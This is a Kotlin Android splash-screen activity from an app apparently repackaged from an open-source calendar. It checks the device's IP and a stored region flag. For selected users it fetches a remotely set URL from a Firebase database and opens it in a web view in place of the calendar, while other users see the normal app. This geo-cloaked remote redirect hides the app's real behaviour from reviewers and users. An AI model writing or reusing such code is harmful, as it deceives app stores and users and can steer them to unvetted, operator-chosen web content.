package com.simplemobiletools.calendar.pro.activities

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.*
import com.simplemobiletools.calendar.pro.AppSharedPreferences
import com.simplemobiletools.calendar.pro.Utils
import com.simplemobiletools.calendar.pro.databinding.ActivitySplashSecondBinding
import com.simplemobiletools.calendar.pro.dialogs.DialogWarningRequestNotify
import com.simplemobiletools.calendar.pro.extensions.getNewEventTimestampFromCode
import com.simplemobiletools.calendar.pro.helpers.*
import kotlinx.android.synthetic.main.activity_splash_second.vgLoading
import org.joda.time.DateTime

class SplashSecondActivity : AppCompatActivity() {
    private var binding: ActivitySplashSecondBinding? = null
    lateinit var sharedPreference: AppSharedPreferences
    private var dialogWarningRequestNotify: DialogWarningRequestNotify? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashSecondBinding.inflate(layoutInflater)
        setContentView(binding?.root)
        initData()
    }

    private fun initData() {
        sharedPreference = AppSharedPreferences(this)
        Utils.getRealeaseKey(this)

        // Tạo một luồng khác để gọi API
        if (getSharedPreferences("MyApp", MODE_PRIVATE).getString("isTH", "").equals("ok", ignoreCase = true)) {
            println("Thắng check isTH ok")
            if (Utils.checkNetWork(this) == 1) {
                binding?.vgLoading?.visibility = View.GONE
                getData()
            } else {
                binding?.vgLoading?.visibility = View.VISIBLE
            }
        } else if (getSharedPreferences("MyApp", MODE_PRIVATE).getString("isTH", "").equals("nok", ignoreCase = true)) {
            println("Thắng check isTH nok")
            if (Utils.checkNetWork(this@SplashSecondActivity) == 1) {
                binding?.vgLoading?.visibility = View.GONE
                Handler().postDelayed({
                    val intent = Intent(this, MainActivity::class.java)
                    startActivity(intent)
                    finish()
                }, 3500)
            } else {
                dialogWarningRequestNotify?.show()

            }
        } else {
            Log.e("TAG", "SplashSecondActivity.initData_53:")
            checkIP()
        }
        setupDialog()


    }

    private fun setupDialog() {
        dialogWarningRequestNotify = DialogWarningRequestNotify.Builder()
            .setOnClickListener(object : DialogWarningRequestNotify.Builder.OnClickDialog {
                override fun onClose() {

                }

                override fun onSetting() {
                    if (sharedPreference.getString("isTH", "").equals("ok", ignoreCase = true)) {
                        if (Utils.checkNetWork(this@SplashSecondActivity) == 1) {
                            vgLoading.visibility = View.GONE
                            getData()
                        }
                    } else if (sharedPreference.getString("isTH", "").equals("nok", ignoreCase = true)) {
                        if (Utils.checkNetWork(this@SplashSecondActivity) == 1) {
                            vgLoading.visibility = View.GONE
                            val intent = Intent(this@SplashSecondActivity, MainActivity::class.java)
                            startActivity(intent)
                            finish()
                        } else {
                            retryCheckIP()
                        }
                    }
                }

            }).build(this)
    }

    var link: String? = null
    private fun getData() {
        val database: FirebaseDatabase = FirebaseDatabase.getInstance()
        val myRef: DatabaseReference = database.reference
        myRef.addListenerForSingleValueEvent(
            object : ValueEventListener {
                override fun onDataChange(dataSnapshot: DataSnapshot) {
                    //here you will get the data
                    link = dataSnapshot.child("link").value.toString()
                    if (link.isNullOrEmpty()) {
                        Handler().postDelayed({
                            flowCalendar()
                            finish()
                        }, 3500)
                    } else {
                        try {
                            Handler().postDelayed({
                                val bundle = Bundle()
                                bundle.putString("link", link)
                                val intent = Intent(this@SplashSecondActivity, WebActivity::class.java)
                                intent.putExtras(bundle)
                                startActivity(intent)
                                finish()
                            }, 3500)
                        } catch (exception: Exception) {
                            flowCalendar()
                            finish()
                        }
                    }
                }

                override fun onCancelled(databaseError: DatabaseError) {
                    Log.d("TAG", "onCancelled: " + databaseError.getDetails())
                }
            })
    }

    private fun flowCalendar() {
        when {
            intent.extras?.containsKey(DAY_CODE) == true -> Intent(this, MainActivity::class.java).apply {
                putExtra(DAY_CODE, intent.getStringExtra(DAY_CODE))
                putExtra(VIEW_TO_OPEN, intent.getIntExtra(VIEW_TO_OPEN, LAST_VIEW))
                startActivity(this)
            }

            intent.extras?.containsKey(EVENT_ID) == true -> Intent(this, MainActivity::class.java).apply {
                putExtra(EVENT_ID, intent.getLongExtra(EVENT_ID, 0L))
                putExtra(EVENT_OCCURRENCE_TS, intent.getLongExtra(EVENT_OCCURRENCE_TS, 0L))
                startActivity(this)
            }

            intent.action == SHORTCUT_NEW_EVENT -> {
                val dayCode = Formatter.getDayCodeFromDateTime(DateTime())
                Intent(this, EventActivity::class.java).apply {
                    putExtra(NEW_EVENT_START_TS, getNewEventTimestampFromCode(dayCode))
                    startActivity(this)
                }
            }

            intent.action == SHORTCUT_NEW_TASK -> {
                val dayCode = Formatter.getDayCodeFromDateTime(DateTime())
                Intent(this, TaskActivity::class.java).apply {
                    putExtra(NEW_EVENT_START_TS, getNewEventTimestampFromCode(dayCode))
                    startActivity(this)
                }
            }

            else -> startActivity(Intent(this, MainActivity::class.java))
        }
    }
    fun checkIP() {
        Thread { // check condition
            if (Utils.checkNetWork(this@SplashSecondActivity) === 1) {
                vgLoading.visibility = View.GONE
                if (Utils.checkIPAdress(sharedPreference.getString("ip", "")!!, this@SplashSecondActivity) == 1) {
                    getData()
                } else {
                    val intent = Intent(this@SplashSecondActivity, MainActivity::class.java)
                    startActivity(intent)
                    finish()
                }
            } else {
                vgLoading.setVisibility(View.VISIBLE)
                dialogWarningRequestNotify?.show()
            }
        }.start()
    }
    fun retryCheckIP() {
        Thread { // check condition
            if (Utils.checkNetWork(this@SplashSecondActivity) == 1) {
                runOnUiThread {
                    vgLoading.visibility = View.GONE
                }
                if (Utils.checkIPAdress(sharedPreference.getString("ip", "")!!, this@SplashSecondActivity) == 1) {
                    getData()
                } else {
                    Handler().postDelayed({
                        val intent = Intent(this@SplashSecondActivity, MainActivity::class.java)
                        startActivity(intent)
                        finish()
                    }, 3500)
                }
            } else {
                dialogWarningRequestNotify?.show()
            }
        }.start()
    }
}
